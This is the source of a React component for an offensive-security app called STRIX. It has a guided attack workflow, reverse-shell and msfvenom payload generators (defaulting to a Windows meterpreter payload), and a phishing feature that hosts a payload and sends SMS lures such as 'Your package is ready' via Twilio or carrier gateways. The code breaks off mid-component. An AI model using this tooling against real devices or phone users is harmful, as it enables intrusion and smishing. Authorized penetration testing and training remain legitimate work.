// STRIX Penetration Testing Hub
// OSCP-style easy-to-use tools: shells, msfvenom, exploits, recon, web, mobile, OS/PE, OSCP helper

import React, { useState, useMemo, useEffect } from 'react';
import {
    Crosshair, Terminal, Copy, Check, ChevronRight, ChevronDown, Shield, Globe, Smartphone, Server,
    BookOpen, Zap, Code, FileCode, HelpCircle, ArrowRight, Loader2, Mail, Activity, Radio, Wifi
} from 'lucide-react';
import { getAvailableLanguages, generateShell, supportsBind } from '../pentest/payloads/shells';
import { payloadTemplates, buildMsfvenomCommand, generateHandlerCommands } from '../pentest/payloads/msfvenom';
import type { ShellLanguage } from '../pentest/payloads/types';
import {
    vulnerabilityDatabase,
    getVulnerabilitiesForPort
} from '../pentest/exploits';
import { msfExploits, getMsfconsoleCommands } from '../pentest/exploits/msf-exploits';

type PentestTab = 'start' | 'quick' | 'shells' | 'msfvenom' | 'exploits' | 'active-exploits' | 'payloads' | 'recon' | 'web' | 'mobile' | 'pe' | 'oscp' | 'phishing' | 'monitor';

/** Heuristic: does target look like a phone number (for SMS phishing) vs device IP/serial (ADB)? */
function looksLikePhoneNumber(value: string): boolean {
    const trimmed = value.trim().replace(/[\s\-\.\(\)]/g, '');
    if (trimmed.length < 7) return false;
    const digits = trimmed.replace(/^\+/, '').replace(/\D/g, '');
    return digits.length >= 7 && digits.length <= 15 && /^\+?[\d\s\-\.\(\)]+$/.test(trimmed);
}

const SEVERITY_COLORS: Record<string, string> = {
    critical: 'bg-red-500/20 text-red-400 border-red-500/50',
    high: 'bg-orange-500/20 text-orange-400 border-orange-500/50',
    medium: 'bg-amber-500/20 text-amber-400 border-amber-500/50',
    low: 'bg-blue-500/20 text-blue-400 border-blue-500/50',
    info: 'bg-gray-500/20 text-gray-400 border-gray-500/50'
};

function CopyButton({ text, label = 'Copy', darkMode }: { text: string; label?: string; darkMode: boolean }) {
    const [copied, setCopied] = useState(false);
    const copy = () => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };
    return (
        <button
            onClick={copy}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${darkMode ? 'bg-gray-700 hover:bg-gray-600 text-gray-200' : 'bg-gray-200 hover:bg-gray-300 text-gray-800'}`}
        >
            {copied ? <Check size={14} /> : <Copy size={14} />}
            {copied ? 'Copied!' : label}
        </button>
    );
}

type WorkflowTargetType = 'mobile' | 'os' | 'web';
type WorkflowOSSub = 'mac' | 'linux' | 'windows' | 'unknown';
type WorkflowMobileSub = 'android' | 'ios';

interface PentestHubProps {
    darkMode?: boolean;
    mode?: PentestTab;
    onNavigateTo?: (mode: PentestTab) => void;
    /** When user runs web recon from workflow, open Web Scanner with this URL. */
    onOpenWebScanner?: (url: string) => void;
}

// @ts-ignore - exists in Electron
const isElectron = typeof window !== 'undefined' && window.ipcRenderer;

export default function PentestHub({ darkMode = true, mode = 'start', onNavigateTo, onOpenWebScanner }: PentestHubProps) {
    // Shared payload config — LHOST default: empty; in Electron we fill from get-local-ip (your real IP)
    const [lhost, setLhost] = useState('');
    const [lport, setLport] = useState('443');

    // In Electron, set LHOST to your machine's first non-internal IPv4 (from ipconfig / network interfaces)
    useEffect(() => {
        if (!isElectron || lhost !== '') return;
        (window as any).ipcRenderer.invoke('get-local-ip').then((ips: string[]) => {
            if (ips && ips.length > 0) setLhost(ips[0]);
        }).catch(() => {});
    }, []);

    // Guided workflow state (Start here)
    const [workflowStep, setWorkflowStep] = useState(1);
    const [workflowTarget, setWorkflowTarget] = useState('');
    const [workflowTargetType, setWorkflowTargetType] = useState<WorkflowTargetType | null>(null);
    const [workflowOSSub, setWorkflowOSSub] = useState<WorkflowOSSub | null>(null);
    const [workflowMobileSub, setWorkflowMobileSub] = useState<WorkflowMobileSub | null>(null);
    const [localIps, setLocalIps] = useState<string[]>([]);
    const [scanResults, setScanResults] = useState<{ target: string; openPorts: Array<{ port: number; state: string; service?: string }> } | null>(null);
    const [isScanning, setIsScanning] = useState(false);
    // Reverse shells
    const [shellLang, setShellLang] = useState<ShellLanguage>('bash');
    const [shellType, setShellType] = useState<'reverse' | 'bind'>('reverse');
    const generatedShell = useMemo(() => {
        try {
            return generateShell({
                language: shellLang,
                type: shellType,
                lhost,
                lport: parseInt(lport, 10) || 443
            });
        } catch {
            return null;
        }
    }, [shellLang, shellType, lhost, lport]);

    // Msfvenom
    const [msfTemplateId, setMsfTemplateId] = useState('win-meterpreter-tcp');
    const msfTemplate = payloadTemplates.find(t => t.id === msfTemplateId);
    const msfvenomCommand = msfTemplate
        ? buildMsfvenomCommand({
            payload: msfTemplate.config.payload!,
            lhost,
            lport: parseInt(lport, 10) || 443,
            format: (msfTemplate.config.format as any) || 'exe',
            encoder: msfTemplate.config.encoder
        })
        : '';
    const handlerCommand = msfTemplate
        ? generateHandlerCommands({
            payload: msfTemplate.config.payload!,
            lhost,
            lport: parseInt(lport, 10) || 443,
            format: (msfTemplate.config.format as 'exe' | 'elf' | 'raw') || 'exe'
        })
        : '';

    // Service → Exploits
    const [portInput, setPortInput] = useState('');
    const portNum = parseInt(portInput, 10);
    const exploitVulns = useMemo(() => {
        if (!portInput.trim()) return [];
        if (!isNaN(portNum) && portNum >= 1 && portNum <= 65535) {
            return getVulnerabilitiesForPort(portNum);
        }
        const service = portInput.trim().toLowerCase();
        const entry = vulnerabilityDatabase[service];
        return entry ? entry.vulns : [];
    }, [portInput, portNum]);

    // Phishing & delivery: host payload + send SMS
    const [payloadServerUrl, setPayloadServerUrl] = useState<string | null>(null);
    const [payloadServerPort, setPayloadServerPort] = useState(8080);
    const [payloadFilePath, setPayloadFilePath] = useState('');
    const [smsTo, setSmsTo] = useState('');
    const [smsBody, setSmsBody] = useState('Your package is ready. Track here: [LINK]');
    const [payloadUrl, setPayloadUrl] = useState('');
    const [twilioSid, setTwilioSid] = useState('');
    const [twilioToken, setTwilioToken] = useState('');
    const [twilioFrom, setTwilioFrom] = useState('');
    const [smsSending, setSmsSending] = useState(false);
    const [smsResult, setSmsResult] = useState<{ ok: boolean; message: string } | null>(null);
    const [liveLinkLoading, setLiveLinkLoading] = useState(false);
    const [liveLinkError, setLiveLinkError] = useState<string | null>(null);
    const [hostPayloadLoading, setHostPayloadLoading] = useState(false);
    const [hostPayloadError, setHostPayloadError] = useState<string | null>(null);
    // Email-to-SMS (no Twilio): carrier gateway + SMTP
    const [emailSmtpHost, setEmailSmtpHost] = useState('smtp.gmail.com');
    const [emailSmtpPort, setEmailSmtpPort] = useState(587);
    const [emailSmtpUser, setEmailSmtpUser] = useState('');
    const [emailSmtpPass, setEmailSmtpPass] = useState('');
    const [emailFrom, setEmailFrom] = useState('');
    const [emailCarrier, setEmailCarrier] = useState('tmobile');
    const [emailSending, setEmailSending] = useState(false);
    const [emailResult, setEmailResult] = useState<{ ok: boolean; message: string } | null>(null);
    const [emailCustomGateway, setEmailCustomGateway] = useState('vtext.com');
    const [exploitRhost, setExploitRhost] = useState('');
    const [selectedExploitId, setSelectedExploitId] = useState<string>(msfExploits[0]?.id ?? '');
    const [selectedPayloadPresetId, setSelectedPayloadPresetId] = useState<string>('win-meterpreter-tcp');
    // Network Monitor: live connections + alerts
    const [liveConnections, setLiveConnections] = useState<Array<{ proto: string; local: string; foreign: string; state: string; service?: string; hostname?: string }>>([]);
    const [liveConnectionsLoading, setLiveConnectionsLoading] = useState(false);
    const [liveConnectionsError, setLiveConnectionsError] = useState<string | null>(null);
    const [monitorAlerts, setMonitorAlerts] = useState<Array<{ id: string; time: string; message: string; severity: 'info' | 'low' | 'medium' | 'high' | 'critical' }>>([]);
    // Live packet capture
    const [capturePackets, setCapturePackets] = useState<Array<{ time: string; src: string; dst: string; protocol: string; length: string; info: string }>>([]);
    const [isCapturing, setIsCapturing] = useState(false);
    const [captureError, setCaptureError] = useState<string | null>(null);
    const [captureInterface, setCaptureInterface] = useState('1');
    const [captureInterfaces, setCaptureInterfaces] = useState<Array<{ index: string; name: string }>>([]);
    const MAX_CAPTURE_PACKETS = 500;
    // WiFi profiles: save credentials, connect this PC, then monitor this device's traffic
    const [wifiProfiles, setWifiProfiles] = useState<Array<{ id: string; name: string; ssid: string }>>([]);
    const [wifiProfileName, setWifiProfileName] = useState('');
    const [wifiProfileSsid, setWifiProfileSsid] = useState('');
    const [wifiProfilePassword, setWifiProfilePassword] = useState('');
    const [wifiConnectMessage, setWifiConnectMessage] = useState<string | null>(null);
    const [wifiConnectError, setWifiConnectError] = useState<string | null>(null);
    // Network devices: scan home network (IP + MAC), mark known, flag unknown
    const [networkDevices, setNetworkDevices] = useState<Array<{ ip: string; mac: string }>>([]);
    const [knownDevices, setKnownDevices] = useState<Array<{ mac: string; ip: string; name: string }>>([]);
    const [networkDevicesLoading, setNetworkDevicesLoading] = useState(false);
    const [knownDeviceName, setKnownDeviceName] = useState<Record<string, string>>({});
    useEffect(() => {
        try {
            const sid = localStorage.getItem('strix-twilio-sid'); if (sid) setTwilioSid(sid);
            const tok = localStorage.getItem('strix-twilio-token'); if (tok) setTwilioToken(tok);
            const from = localStorage.getItem('strix-twilio-from'); if (from) setTwilioFrom(from);
        } catch { /* ignore */ }
    }, []);
    useEffect(() => {
        if (mode === 'phishing' && workflowTarget.trim() && looksLikePhoneNumber(workflowTarget) && !smsTo) setSmsTo(workflowTarget.trim());
    }, [mode, workflowTarget, smsTo]);
    useEffect(() => {
        if (mode === 'active-exploits' && workflowTarget.trim() && !exploitRhost) setExploitRhost(workflowTarget.trim());
    }, [mode, workflowTarget, exploitRhost]);

    // Subscribe to live packet stream and capture errors when in monitor (Electron)
    useEffect(() => {
        if (!isElectron || mode !== 'monitor') return;
        const onPacket = (_: unknown, p: { time: string; src: string; dst: string; protocol: string; length: string; info: string }) => {
            setCapturePackets(prev => [p, ...prev].slice(0, MAX_CAPTURE_PACKETS));
        };
        const onError = (_: unknown, msg: string) => {
            setCaptureError(prev => prev ? `${prev}; ${msg}` : msg);
        };
        (window as any).ipcRenderer?.on('packet-capture-data', onPacket);
        (window as any).ipcRenderer?.on('packet-capture-error', onError);
        return () => {
            (window as any).ipcRenderer?.off?.('packet-capture-data', onPacket);
            (window as any).ipcRenderer?.off?.('packet-capture-error', onError);
        };
    }, [mode]);

    // Load list of capture interfaces when entering monitor (Electron)
    useEffect(() => {
        if (!isElectron || mode !== 'monitor') return;
        (window as any).ipcRenderer.invoke('list-capture-interfaces').then((res: { success: boolean; interfaces?: Array<{ index: string; name: string }> }) => {
            if (res.success && res.interfaces && res.interfaces.length > 0) {
                setCaptureInterfaces(res.interfaces);
                setCaptureInterface(prev => {
                    const hasCurrent = res.interfaces!.some(i => i.index === prev);
                    return hasCurrent ? prev : res.interfaces![0].index;
                });
            } else setCaptureInterfaces([]);
        }).catch(() => setCaptureInterfaces([]));
    }, [mode]);

    // Auto-refresh live connections every 5s when on monitor tab (SIEM: see website traffic without clicking)
    useEffect(() => {
        if (!isElectron || mode !== 'monitor') return;
        const refresh = () => {
            (window as any).ipcRenderer.invoke('get-live-connections').then((res: { success: boolean; connections?: typeof liveConnections }) => {
                if (res.success && res.connections) setLiveConnections(res.connections);
            }).catch(() => {});
        };
        refresh();
        const t = setInterval(refresh, 5000);
        return () => clearInterval(t);
    }, [mode]);

    // Load WiFi profiles when entering monitor (Electron)
    useEffect(() => {
        if (!isElectron || mode !== 'monitor') return;
        (window as any).ipcRenderer.invoke('wifi-get-profiles').then((res: { success: boolean; profiles?: typeof wifiProfiles }) => {
            if (res.success && res.profiles) setWifiProfiles(res.profiles);
        }).catch(() => {});
    }, [mode]);

    // Load known devices when entering monitor (Electron)
    useEffect(() => {
        if (!isElectron || mode !== 'monitor') return;
        (window as any).ipcRenderer.invoke('get-known-devices').then((res: { success: boolean; devices?: typeof knownDevices }) => {
            if (res.success && res.devices) setKnownDevices(res.devices);
        }).catch(() => {});
    }, [mode]);

    const sectionTitles: Record<PentestTab, string> = {
        start: 'Start here',
        quick: 'Quick Tools',
        shells: 'Reverse Shells',
        msfvenom: 'Msfvenom',
        exploits: 'Service → Exploits',
        'active-exploits': 'Active Exploits',
        payloads: 'Payloads',
        recon: 'Recon',
        web: 'Web',
        mobile: 'Mobile (iOS / Android)',
        pe: 'OS / Privilege Escalation',
        oscp: 'OSCP Helper',
        phishing: 'Phishing & Delivery',
        monitor: 'Network Monitor (SIEM)'
    };

    return (
        <div className="h-[calc(100vh-100px)] flex flex-col">
            <div className="flex items-center justify-between mb-6">
                <div>
                    <h1 className="text-3xl font-semibold tracking-tight flex items-center gap-3">
                        <Crosshair className={darkMode ? 'text-cyan-400' : 'text-cyan-600'} />
                        {mode === 'quick' ? 'Penetration Testing' : sectionTitles[mode]}
                    </h1>
                    <p className={`mt-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                        {mode === 'start' ? 'New to pentesting? Start here.' : mode === 'quick'
                            ? 'One-click shells, payloads, exploit lookup &amp; OSCP-style workflows'
                            : `Use the left sidebar to switch between tools.`}
                    </p>
                </div>
            </div>

            {/* Global LHOST/LPORT bar — only show when relevant (not on Start here) */}
            {mode !== 'start' && (
                <div className={`flex flex-wrap items-center gap-6 p-4 rounded-xl border mb-6 ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                    <div>
                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                            LHOST — your computer&apos;s IP address
                        </label>
                        <input
                            type="text"
                            value={lhost}
                            onChange={e => setLhost(e.target.value)}
                            className={`w-40 px-3 py-2 rounded-lg text-sm font-mono border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            placeholder="e.g. 10.10.14.1"
                        />
                        <p className={`text-xs mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Where the target will connect back to you</p>
                    </div>
                    <div>
                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                            LPORT — port you&apos;ll listen on
                        </label>
                        <input
                            type="text"
                            value={lport}
                            onChange={e => setLport(e.target.value)}
                            className={`w-24 px-3 py-2 rounded-lg text-sm font-mono border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                            placeholder="443"
                        />
                        <p className={`text-xs mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>e.g. 443 (often allowed through firewalls)</p>
                    </div>
                </div>
            )}

            {/* Content */}
            <div className={`flex-1 overflow-y-auto rounded-xl border p-6 ${darkMode ? 'bg-gray-800/30 border-gray-700' : 'bg-white border-gray-200'}`}>

                {mode === 'start' && (
                    <div className="max-w-2xl space-y-6">
                        {/* Tabs: Listener | Target | Target Type | Recon | Exploit — spread full width */}
                        <div className={`flex w-full gap-1 p-1 rounded-xl border ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-gray-100 border-gray-200'}`}>
                            {[
                                { step: 1, label: 'Listener' },
                                { step: 2, label: 'Target' },
                                { step: 3, label: 'Target Type' },
                                { step: 4, label: 'Recon' },
                                { step: 5, label: 'Exploit' }
                            ].map(({ step, label }) => (
                                <button
                                    key={step}
                                    type="button"
                                    onClick={() => setWorkflowStep(step)}
                                    className={`flex-1 min-w-0 px-3 py-2.5 rounded-lg text-sm font-medium transition-all text-center ${workflowStep === step
                                        ? darkMode ? 'bg-cyan-600 text-white shadow' : 'bg-cyan-600 text-white shadow'
                                        : darkMode ? 'text-gray-400 hover:text-gray-200 hover:bg-gray-700' : 'text-gray-600 hover:text-gray-900 hover:bg-gray-200'
                                    }`}
                                >
                                    {workflowStep > step ? <Check size={14} className="inline mr-1.5 -mt-0.5" /> : null}
                                    {label}
                                </button>
                            ))}
                        </div>

                        {/* Chosen-so-far summary */}
                        {(workflowTarget.trim() || workflowTargetType) && (
                            <div className={`flex flex-wrap items-center gap-2 text-sm px-4 py-3 rounded-xl ${darkMode ? 'bg-gray-800/80 text-gray-300' : 'bg-gray-100 text-gray-700'}`}>
                                <span className="font-mono font-medium">{lhost}:{lport}</span>
                                {workflowTarget.trim() && <><span className={darkMode ? 'text-gray-500' : 'text-gray-400'}>→</span><span className="font-mono">{workflowTarget.trim()}</span></>}
                                {workflowTargetType && <><span className={darkMode ? 'text-gray-500' : 'text-gray-400'}>→</span><span>{workflowTargetType}{workflowOSSub ? ` (${workflowOSSub})` : workflowMobileSub ? ` (${workflowMobileSub})` : ''}</span></>}
                            </div>
                        )}

                        {/* Step 1: Listener */}
                        {workflowStep === 1 && (
                            <div className="space-y-6">
                                <h2 className="text-lg font-semibold">1. Set your listener (LHOST + LPORT)</h2>
                                <div>
                                    <p className={`text-sm mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Your IP — where the target will connect back to you</p>
                                    {isElectron ? (
                                        <div className="flex flex-wrap items-center gap-2">
                                            <button
                                                type="button"
                                                onClick={async () => {
                                                    try {
                                                        const ips = await (window as any).ipcRenderer.invoke('get-local-ip');
                                                        setLocalIps(ips);
                                                        if (ips.length) setLhost(ips[0]);
                                                    } catch (e) {
                                                        setLocalIps([]);
                                                    }
                                                }}
                                                className={`px-4 py-2 rounded-lg text-sm font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}
                                            >
                                                Use my IP
                                            </button>
                                            {localIps.length > 1 && (
                                                <select
                                                    value={lhost}
                                                    onChange={e => setLhost(e.target.value)}
                                                    className={`px-3 py-2 rounded-lg text-sm font-mono border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                                >
                                                    {localIps.map(ip => (
                                                        <option key={ip} value={ip}>{ip}</option>
                                                    ))}
                                                </select>
                                            )}
                                            {localIps.length > 0 && <span className={`text-sm font-mono ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>{lhost}</span>}
                                        </div>
                                    ) : (
                                        <input
                                            type="text"
                                            value={lhost}
                                            onChange={e => setLhost(e.target.value)}
                                            placeholder="e.g. 10.10.14.1"
                                            className={`w-full max-w-xs px-3 py-2 rounded-lg font-mono border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                        />
                                    )}
                                </div>
                                <div>
                                    <p className={`text-sm mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>LPORT — click a port to assign it (no typing needed)</p>
                                    <div className="flex flex-wrap gap-2">
                                        {['443', '4444', '80', '8080'].map(p => (
                                            <button
                                                key={p}
                                                type="button"
                                                onClick={() => setLport(p)}
                                                className={`px-4 py-2 rounded-lg text-sm font-medium font-mono ${lport === p
                                                    ? darkMode ? 'bg-cyan-600 text-white' : 'bg-cyan-600 text-white'
                                                    : darkMode ? 'bg-gray-700 hover:bg-gray-600 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700'
                                                }`}
                                            >
                                                {p}
                                            </button>
                                        ))}
                                        <input
                                            type="text"
                                            value={['443','4444','80','8080'].includes(lport) ? '' : lport}
                                            onChange={e => setLport(e.target.value || '443')}
                                            placeholder="Custom"
                                            className={`w-20 px-3 py-2 rounded-lg text-sm font-mono border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                        />
                                    </div>
                                    <p className={`text-xs mt-2 font-medium ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>Assigned LPORT: <span className="font-mono">{lport || '443'}</span></p>
                                </div>
                                <button type="button" onClick={() => setWorkflowStep(2)} className={`px-5 py-2.5 rounded-lg font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}>
                                    Next: Target <ArrowRight size={16} className="inline ml-1" />
                                </button>
                            </div>
                        )}

                        {/* Step 2: Target */}
                        {workflowStep === 2 && (
                            <div className="space-y-6">
                                <h2 className="text-lg font-semibold">2. Enter target</h2>
                                <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                                    <strong>Web/OS:</strong> IP or domain (e.g. 192.168.1.10, target.example.com).<br />
                                    <strong>Mobile:</strong> device IP for ADB (e.g. 192.168.1.50) or <strong>phone number</strong> for SMS phishing (e.g. +1234567890).
                                </p>
                                <input
                                    type="text"
                                    value={workflowTarget}
                                    onChange={e => setWorkflowTarget(e.target.value)}
                                    placeholder="IP, domain, device IP, or phone number (+1...)"
                                    className={`w-full max-w-md px-4 py-3 rounded-lg font-mono border text-base ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                />
                                <div className="flex gap-2">
                                    <button type="button" onClick={() => setWorkflowStep(1)} className={`px-4 py-2 rounded-lg border ${darkMode ? 'border-gray-600 text-gray-300' : 'border-gray-300 text-gray-700'}`}>
                                        Back
                                    </button>
                                    <button type="button" onClick={() => setWorkflowStep(3)} disabled={!workflowTarget.trim()} className={`px-5 py-2.5 rounded-lg font-medium ${workflowTarget.trim() ? (darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white') : 'opacity-50 cursor-not-allowed bg-gray-500 text-white'}`}>
                                        Next: Target type <ArrowRight size={16} className="inline ml-1" />
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* Step 3: Target type */}
                        {workflowStep === 3 && (
                            <div className="space-y-6">
                                <h2 className="text-lg font-semibold">3. What are you targeting?</h2>
                                {workflowTargetType === null ? (
                                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                                        {[
                                            { id: 'web' as const, label: 'Web', desc: 'Website or web app (domain or IP)' },
                                            { id: 'os' as const, label: 'OS', desc: 'Computer or server (Windows, Linux, Mac)' },
                                            { id: 'mobile' as const, label: 'Mobile', desc: 'Phone or tablet (Android, iOS)' }
                                        ].map(({ id, label, desc }) => (
                                            <button
                                                key={id}
                                                type="button"
                                                onClick={() => setWorkflowTargetType(id)}
                                                className={`p-5 rounded-xl border text-left transition-all ${darkMode ? 'bg-gray-800 border-gray-700 hover:border-cyan-500' : 'bg-white border-gray-200 hover:border-cyan-400'}`}
                                            >
                                                <div className="font-semibold text-lg mb-1">{label}</div>
                                                <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{desc}</p>
                                            </button>
                                        ))}
                                    </div>
                                ) : workflowTargetType === 'os' && workflowOSSub === null ? (
                                    <div className="space-y-4">
                                        <p className={darkMode ? 'text-gray-400' : 'text-gray-500'}>What OS is the target running?</p>
                                        <div className="flex flex-wrap gap-2">
                                            {(['windows', 'linux', 'mac', 'unknown'] as const).map(sub => (
                                                <button key={sub} type="button" onClick={() => setWorkflowOSSub(sub)} className={`px-4 py-2 rounded-lg capitalize ${darkMode ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-200 hover:bg-gray-300'}`}>
                                                    {sub === 'unknown' ? 'Not sure' : sub}
                                                </button>
                                            ))}
                                        </div>
                                        <button type="button" onClick={() => setWorkflowTargetType(null)} className="text-sm text-cyan-500">← Change to Web/Mobile</button>
                                    </div>
                                ) : workflowTargetType === 'mobile' && workflowMobileSub === null ? (
                                    <div className="space-y-4">
                                        <p className={darkMode ? 'text-gray-400' : 'text-gray-500'}>Which platform?</p>
                                        <div className="flex flex-wrap gap-2">
                                            <button type="button" onClick={() => setWorkflowMobileSub('android')} className={`px-4 py-2 rounded-lg ${darkMode ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-200 hover:bg-gray-300'}`}>Android</button>
                                            <button type="button" onClick={() => setWorkflowMobileSub('ios')} className={`px-4 py-2 rounded-lg ${darkMode ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-200 hover:bg-gray-300'}`}>iOS</button>
                                        </div>
                                        <p className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                            Target field: use <strong>device IP</strong> (or serial) for ADB; use <strong>phone number</strong> (e.g. +1…) for SMS phishing. See <strong>Phishing</strong> in the sidebar to send exploits.
                                        </p>
                                        <button type="button" onClick={() => setWorkflowTargetType(null)} className="text-sm text-cyan-500">← Change to Web/OS</button>
                                    </div>
                                ) : (
                                    <div className={`p-4 rounded-xl ${darkMode ? 'bg-gray-800' : 'bg-gray-50'}`}>
                                        <p className="text-sm">
                                            Target: <strong className="font-mono">{workflowTarget}</strong><br />
                                            Type: <strong>{workflowTargetType}</strong>
                                            {workflowOSSub && ` (${workflowOSSub})`}
                                            {workflowMobileSub && ` (${workflowMobileSub})`}
                                        </p>
                                        <button type="button" onClick={() => { setWorkflowTargetType(null); setWorkflowOSSub(null); setWorkflowMobileSub(null); }} className="text-sm text-cyan-500 mt-2">Change</button>
                                    </div>
                                )}
                                {(workflowTargetType === 'web' || workflowOSSub !== null || workflowMobileSub !== null) && (
                                    <div className="flex gap-2">
                                        <button type="button" onClick={() => { if (workflowTargetType === 'os') setWorkflowOSSub(null); else if (workflowTargetType === 'mobile') setWorkflowMobileSub(null); else setWorkflowTargetType(null); }} className="px-4 py-2 rounded-lg border">Back</button>
                                        <button type="button" onClick={() => setWorkflowStep(4)} className="px-5 py-2.5 rounded-lg font-medium bg-cyan-600 hover:bg-cyan-500 text-white">
                                            Next: Run recon <ArrowRight size={16} className="inline ml-1" />
                                        </button>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Step 4: Recon */}
                        {workflowStep === 4 && (
                            <div className="space-y-6">
                                <h2 className="text-lg font-semibold">4. Run recon — one click and the system goes</h2>
                                <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                                    Target: <strong className="font-mono">{workflowTarget}</strong> — {workflowTargetType}
                                    {workflowOSSub && ` (${workflowOSSub})`}
                                    {workflowMobileSub && ` (${workflowMobileSub})`}
                                </p>

                                {/* Single "Run recon" dispatch: one click does the right thing */}
                                {(workflowTargetType === 'os' && isElectron) || workflowTargetType === 'web' ? (
                                    <button
                                        type="button"
                                        onClick={async () => {
                                            if (workflowTargetType === 'os' && isElectron) {
                                                setIsScanning(true);
                                                setScanResults(null);
                                                try {
                                                    const res = await (window as any).ipcRenderer.invoke('run-port-scan', { target: workflowTarget });
                                                    setScanResults({ target: res.target, openPorts: res.openPorts });
                                                } catch {
                                                    setScanResults({ target: workflowTarget, openPorts: [] });
                                                }
                                                setIsScanning(false);
                                            } else if (workflowTargetType === 'web') {
                                                const url = workflowTarget.match(/^https?:\/\//) ? workflowTarget : `https://${workflowTarget}`;
                                                onOpenWebScanner?.(url);
                                            }
                                        }}
                                        disabled={workflowTargetType === 'os' && isScanning}
                                        className={`px-6 py-3 rounded-xl font-semibold flex items-center gap-2 ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'} disabled:opacity-50`}
                                    >
                                        {workflowTargetType === 'os' && isScanning ? <><Loader2 size={20} className="animate-spin" /> Scanning…</> : <>Run recon</>}
                                    </button>
                                ) : workflowTargetType === 'mobile' ? (
                                    <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Use the commands below for mobile recon (ADB, Frida). Connect the device first.</p>
                                ) : null}

                                {workflowTargetType === 'os' && isElectron && (
                                    <>
                                        {scanResults && (
                                            <div className={`rounded-xl border overflow-hidden ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                                                <div className={`px-4 py-2 border-b ${darkMode ? 'border-gray-700' : 'border-gray-200'}`}>
                                                    <strong>Open ports on {scanResults.target}</strong>
                                                </div>
                                                <ul className="divide-y divide-gray-700 max-h-64 overflow-y-auto">
                                                    {scanResults.openPorts.length === 0 ? (
                                                        <li className="px-4 py-3 text-sm text-gray-500">No common ports open (or target unreachable).</li>
                                                    ) : (
                                                        scanResults.openPorts.map(({ port, service }) => (
                                                            <li key={port} className="px-4 py-2 flex items-center justify-between">
                                                                <span className="font-mono">{port}</span>
                                                                <span className={darkMode ? 'text-cyan-400' : 'text-cyan-600'}>{service || 'unknown'}</span>
                                                            </li>
                                                        ))
                                                    )}
                                                </ul>
                                                <p className={`px-4 py-2 text-xs border-t ${darkMode ? 'border-gray-700 text-gray-500' : 'border-gray-200 text-gray-500'}`}>
                                                    Use <strong>Service → Exploits</strong> in the sidebar and enter a port number to see known vulnerabilities.
                                                </p>
                                                <button type="button" onClick={async () => { setIsScanning(true); setScanResults(null); try { const res = await (window as any).ipcRenderer.invoke('run-port-scan', { target: workflowTarget }); setScanResults({ target: res.target, openPorts: res.openPorts }); } catch { setScanResults({ target: workflowTarget, openPorts: [] }); } setIsScanning(false); }} disabled={isScanning} className={`px-3 py-1.5 text-sm ${darkMode ? 'text-cyan-400 hover:underline' : 'text-cyan-600 hover:underline'}`}>Scan again</button>
                                            </div>
                                        )}
                                    </>
                                )}

                                {workflowTargetType === 'web' && (
                                    <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Web Scanner will open with <strong className="font-mono">{workflowTarget}</strong>. Use the &quot;Run recon&quot; button above to open it.</p>
                                )}

                                {workflowTargetType === 'mobile' && !looksLikePhoneNumber(workflowTarget) && (
                                    <div className={`p-4 rounded-xl ${darkMode ? 'bg-gray-800' : 'bg-gray-50'}`}>
                                        <p className="text-sm mb-2">Device target (ADB): connect the device (USB or same network) and run:</p>
                                        <pre className={`p-3 rounded-lg font-mono text-sm ${darkMode ? 'bg-gray-900 text-gray-200' : 'bg-gray-100 text-gray-800'}`}>
                                            adb devices
                                        </pre>
                                        <p className="text-xs mt-2">Then use the <strong>Mobile</strong> section in the sidebar for ADB, Frida, and objection.</p>
                                    </div>
                                )}

